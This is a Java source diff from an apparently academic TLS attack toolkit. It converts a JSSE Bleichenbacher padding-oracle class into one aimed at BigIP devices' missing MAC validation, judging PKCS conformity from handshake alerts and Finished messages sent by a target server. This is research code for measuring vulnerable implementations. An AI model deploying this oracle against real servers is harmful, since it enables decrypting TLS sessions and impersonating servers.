@@ -16,32 +16,21 @@ import java.security.PublicKey;
 import java.util.Observable;
 
 /**
- * JSSE Bleichenbacher oracle - Alert:Internal_Error in special cases.
- * Conditions: keylength >= 2048bit and 0x00 byte in the padding String
- * (additional to the separation 0x00 byte) of the PKCS construct as part of the
- * ClientKeyExchange message.
- *
- * Successfully tested on java version "1.6.0_20" OpenJDK Runtime Environment
- * (IcedTea6 1.9.13) (6b20-1.9.13-0ubuntu1~10.10.1) OpenJDK 64-Bit Server VM
- * (build 19.0-b09, mixed mode)
- *
+ * Oracle for BigIP Devices - uses missing MAC validation.
  * @author Christopher Meyer - christopher.meyer@rub.de
  * @version 0.1
  *
  * May 18, 2012
  */
-public final class JSSE16Oracle extends ASSLServerOracle {
-    
-    private int counter = 0;
+public final class BigIPOracle extends ASSLServerOracle {
 
     /**
-     * Initialize the JSSE oracle.
-     * Known to be functional at least until JDK 1.6.35
+     * Initialize the BigIP oracle.
      * @param serverAddress Address of the target server
-     * @param serverPort
+     * @param serverPort Port of the target server
      * @throws SocketException 
      */
-    public JSSE16Oracle(final String serverAddress, final int serverPort)
+    public BigIPOracle(final String serverAddress, final int serverPort)
             throws SocketException {
         super(serverAddress, serverPort);
         oracleType = OracleType.FFT;
@@ -53,9 +42,8 @@ public final class JSSE16Oracle extends ASSLServerOracle {
     @Override
     public boolean checkPKCSConformity(final byte[] msg) throws
             OracleException {
-        System.out.println(counter++ + ": YYYY");
         executeWorkflow(msg, ESupportedSockets.StandardSocket);
-
+        
         return getOracleResult();
     }
 
@@ -101,10 +89,13 @@ public final class JSSE16Oracle extends ASSLServerOracle {
                     Alert alert = new Alert(trace.getCurrentRecord().
                             encode(false), false);
 
-                    if (EAlertDescription.INTERNAL_ERROR.equals(alert.
+                    if (EAlertDescription.HANDSHAKE_FAILURE.equals(alert.
                             getAlertDescription())) {
-                        setOracleResult(true);
+                        setOracleResult(false);
                     }
+                    break;
+                case SERVER_FINISHED:
+                    setOracleResult(true);
                     break;
                 default:
                     break;
